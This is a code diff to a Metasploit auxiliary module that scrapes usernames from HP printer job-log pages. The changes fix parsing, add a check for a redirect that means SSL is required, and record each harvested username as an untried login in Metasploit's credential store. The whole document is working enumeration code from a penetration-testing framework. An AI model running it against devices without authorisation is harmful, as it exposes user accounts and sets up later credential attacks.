@@ -40,7 +40,7 @@ class Metasploit3 < Msf::Auxiliary
   def run_host(ip)
 
     @uri_page = "/hp/device/this.LCDispatcher?nav=hp.ColorUsage"
-    
+
     print_status("Attempting to enumerate usernames from: #{rhost}")
 
     jobs = get_number_of_jobs(rhost)
@@ -48,7 +48,7 @@ class Metasploit3 < Msf::Auxiliary
 
     users = get_usernames(jobs)
     return if users.nil?
-    
+
     usernames = ""
     unless users.blank?
       users.each do |user|
@@ -64,12 +64,17 @@ class Metasploit3 < Msf::Auxiliary
       p = store_loot(loot_name, loot_type, datastore['RHOST'], usernames , loot_filename, loot_desc)
       print_status("Credentials saved in: #{p.to_s}")
     end
+
+    users.each do | user |
+       register_creds('HP-HTTP', rhost, '80', user, "")
+    end
+
   end
 
 
   def get_number_of_jobs(rhost)
     begin
-  
+
       res = send_request_cgi(
         {
           'uri'       => @uri_page,
@@ -80,16 +85,21 @@ class Metasploit3 < Msf::Auxiliary
       print_error("#{rhost}:#{rport} - Connection failed.")
       return
     end
-   
+
     if res == nil
       print_error("#{rhost}:#{rport} - Connection failed.")
-      return 
+      return
     end
-    
-    html_body = ::Nokogiri::HTML(res.body) 
-    data_to_parse_for_jobs = html_body.xpath('/html/body/table/tbody/tr/td/div/div/div[5]')
 
-    #check to see if the number of jobs is empty. If so return zero my friend.  
+    if res.code == 301
+      print_error("#{rhost} requires SSL enabled")
+      return
+    end
+
+    html_body = ::Nokogiri::HTML(res.body)
+    #data_to_parse_for_jobs = html_body.xpath('/html/body/table/tbody/tr/td/div/div/div[5]')
+    data_to_parse_for_jobs = html_body.xpath('/html/body/table[2]/tbody/tr[2]/td[2]/div/div[3]/div[2]/div[2]')
+    #check to see if the number of jobs is empty. If so return zero my friend.
     begin
       number_of_jobs = data_to_parse_for_jobs[0].text.scan(/of\s(\d*?)\)/)
       unless number_of_jobs.empty?
@@ -100,15 +110,15 @@ class Metasploit3 < Msf::Auxiliary
     rescue
       print_error("Not sure what happend. Need more testing")
       return
-    end  
+    end
   end
 
   def get_usernames(jobs)
     pages = jobs[0].to_i
     usernames = []
-    while pages >= 0 do 
+    while pages >= 0 do
       user_record_page = "#{@uri_page}&startRecord=#{pages}"
-      
+
       begin
         res = send_request_cgi(
           {
@@ -117,14 +127,14 @@ class Metasploit3 < Msf::Auxiliary
           }, datastore['TIMEOUT'].to_i)
       rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE
         print_error("#{rhost}:#{rport} - Connection failed.")
-        return 
+        return
       end
 
       if res == nil
         print_error("#{rhost}:#{rport} - Connection failed.")
-        return 
+        return
       end
-      
+
       html_body = ::Nokogiri::HTML(res.body)
       data = html_body.xpath('/html/body/table/tbody/tr/td/div/div/table/tr/td[2]')
       data.collect do | line |
@@ -134,8 +144,38 @@ class Metasploit3 < Msf::Auxiliary
           usernames << line.content.strip
         end
       end
-      pages -= 100  
+      pages -= 100
     end
-    return usernames.uniq!
+    return usernames.uniq
+  end
+
+  def register_creds (service_name, remote_host, remote_port, username, password)
+    credential_data = {
+       origin_type: :service,
+       module_fullname: self.fullname,
+       workspace_id: myworkspace.id,
+       private_data: password,
+       username: username,
+       }
+
+    service_data = {
+      address: remote_host,
+      port: remote_port,
+      service_name: service_name,
+      protocol: 'tcp',
+      workspace_id: myworkspace_id
+      }
+
+    credential_data.merge!(service_data)
+    credential_core = create_credential(credential_data)
+
+    login_data = {
+      core: credential_core,
+      status: Metasploit::Model::Login::Status::UNTRIED,
+      workspace_id: myworkspace_id
+    }
+
+    login_data.merge!(service_data)
+    create_credential_login(login_data)
   end
 end
